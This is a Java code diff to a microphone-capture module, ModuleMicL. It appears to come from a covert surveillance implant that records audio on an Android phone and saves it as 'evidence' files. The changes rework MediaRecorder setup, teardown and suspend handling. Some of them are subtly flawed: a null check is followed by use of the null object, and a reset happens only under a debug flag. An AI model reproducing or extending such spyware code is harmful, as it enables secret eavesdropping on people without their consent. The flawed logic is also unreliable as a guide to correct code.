@@ -69,7 +69,7 @@ public class ModuleMicL extends ModuleMic {
 				fin.read(ret);
 			} catch (IOException ioe) {
 				if (Cfg.DEBUG) {
-					Check.log(TAG + "Exception while reading file " + ioe);
+					Check.log(TAG + "(getAvailable)  Exception while reading file " + ioe);
 				}
 			} finally {
 				// close the streams using close method
@@ -79,11 +79,12 @@ public class ModuleMicL extends ModuleMic {
 					}
 				} catch (IOException ioe) {
 					if (Cfg.DEBUG) {
-						Check.log(TAG + "Error while closing stream: " + ioe);
+						Check.log(TAG + "(getAvailable) Error while closing stream: " + ioe);
 					}
 				}
 			}
 		}
+		Check.log(TAG + "(getAvailable) returning " + ret.length);
 		return ret;
 	}
 
@@ -107,23 +108,29 @@ public class ModuleMicL extends ModuleMic {
 				Check.log(TAG + " (specificStart) new recorder ");//$NON-NLS-1$
 			}
 			recorder = new MediaRecorder();
+			recorder.reset();
 		}
-		recorder.setOnErrorListener(this);
-		recorder.setOnInfoListener(this);
+		if(recorder == null){
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " (specificStart) error requesting recorder ");//$NON-NLS-1$
+			}
+		}
 		recorder.setAudioSource(MediaRecorder.AudioSource.MIC);
 		recorder.setOutputFormat(MediaRecorder.OutputFormat.RAW_AMR);
-
+		recorder.setOnErrorListener(this);
+		recorder.setOnInfoListener(this);
+		recorder.setMaxFileSize(MAX_FILE_SIZE);
+		recorder.setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB);
 		createSockets();
 		if (out_file != null) {
 			recorder.setOutputFile(out_file.getFilename());
 		} else {
-			recorder.reset();
-			recorder.release();
+			recorder.reset();  // You can reuse the object by going back to setAudioSource() step
+			recorder.release();// Now the object cannot be reused
 			recorder = null;
 		}
 		try {
-			recorder.setMaxFileSize(MAX_FILE_SIZE);
-			recorder.setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB);
+
 			recorder.prepare();
 			recorder.start(); // Recording is now started
 		} catch (Exception e) {
@@ -131,8 +138,8 @@ public class ModuleMicL extends ModuleMic {
 				Check.log(TAG + " (specificStart) another apps may be blocking recording: " + e);//$NON-NLS-1$
 			}
 			if (recorder != null) {
-				recorder.reset();
-				recorder.release();
+				recorder.reset();  // You can reuse the object by going back to setAudioSource() step
+				recorder.release();// Now the object cannot be reused
 				recorder = null;
 			}
 			if (out_file != null) {
@@ -175,9 +182,14 @@ public class ModuleMicL extends ModuleMic {
 
 			try {
 				recorder.stop();
+				recorder.reset();  // You can reuse the object by going back to setAudioSource() step
 			} catch (Exception ex) {
 				if (Cfg.DEBUG) {
 					Check.log(ex);
+				}
+				if (Cfg.DEBUG) {
+					Check.log(TAG + " (saveRecorderEvidence) resetting recorder");
+					recorder = null;
 				}
 			}
 			if (out_file == null || !out_file.exists()) {
@@ -190,6 +202,22 @@ public class ModuleMicL extends ModuleMic {
 				saveRecorderEvidence();
 			}
 		}
+	}
+
+	@Override
+	void specificSuspend() {
+		if (Cfg.DEBUG) {
+			Check.log(TAG + " (specificSuspend): releasing recorder");
+		}
+		stopRecorder();
+		deleteSockets();
+		recorder.release();
+		recorder=null;
+	}
+
+	@Override
+	void specificResume() {
+
 	}
 
 	public void onInfo(MediaRecorder mr, int what, int extra) {
@@ -223,7 +251,10 @@ public class ModuleMicL extends ModuleMic {
 		if (Cfg.DEBUG) {
 			Check.log(TAG + " (onError) Error: " + what);//$NON-NLS-1$
 		}
-		suspend();
+		base_suspend();
 	}
-
+	@Override
+	public String getTag() {
+		return TAG;
+	}
 }
